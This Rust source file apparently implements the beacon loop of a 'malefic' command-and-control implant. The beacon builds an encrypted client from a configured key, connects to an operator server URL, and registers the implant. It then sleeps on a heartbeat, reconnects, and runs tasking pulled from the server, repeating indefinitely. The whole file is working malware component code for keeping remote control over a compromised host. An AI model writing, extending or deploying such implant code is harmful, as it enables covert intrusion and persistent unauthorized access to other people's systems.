use futures_timer::Delay;
use std::time::Duration;
use crate::malefic::MaleficChannel;
use crate::stub::MaleficStub;
use malefic_core::config;
use malefic_core::transport::{Client, DialerExt};
use malefic_helper::debug;
use malefic_proto::crypto::new_cryptor;
use malefic_proto::marshal_one;

pub struct MaleficBeacon {
    stub: MaleficStub,
    client: Client,
}

impl MaleficBeacon {
    pub fn new(instance_id: [u8; 4], channel: MaleficChannel) -> Result<Self, Box<dyn std::error::Error>> {
        let stub = MaleficStub::new(instance_id, channel);
        let iv: Vec<u8> = config::KEY.to_vec().iter().rev().cloned().collect();

        let client = Client::new(new_cryptor(config::KEY.to_vec(), iv))
            .map_err(|e| {
                debug!("[beacon] Failed to initialize client: {}", e);
                e
            })?;

        Ok(MaleficBeacon {
            client,
            stub,
        })
    }

    pub async fn run(&mut self) -> Result<(), ()> {
        #[cfg(debug_assertions)]
        let _defer = malefic_helper::Defer::new("[beacon] beacon exit!");

        let mut addr = self.stub.meta.urls.first().unwrap().clone();
        let transport = self.client.connect(addr.as_str()).await.map_err(|_e| {
            debug!("[beacon] Failed to connect to server: {:#?}", _e);
            return ();
        })?;

        let data =
            marshal_one(self.stub.meta.get_uuid(), self.stub.register_spite()).map_err(|_e| {
                debug!("[beacon] Failed to register: {:#?}", _e);
                return ();
            })?;
        self.client.handler(transport, data)
            .await
            .map_err(|_e| {
                debug!("[beacon] Failed to send data: {:#?}", _e);
                return ();
            })?;
        loop {
            let sleep_time = Duration::from_millis(self.stub.meta.new_heartbeat());
            debug!("[beacon] sleeping {:?}", sleep_time);
            Delay::new(sleep_time).await;
            addr = self.stub.meta.urls.first().unwrap().clone();
            match self.client.connect(addr.as_str()).await {
                Ok(transport) => {
                    if let Err(_e) = self.stub.process_data(transport, &mut self.client).await {
                        debug!("[beacon] Error processing spite data: {:#?}", _e);
                        continue;
                    }
                }
                Err(_e) => {
                    debug!("[beacon] Failed to connect to server: {:#?}", _e);
                    continue;
                }
            }
        }
    }
}
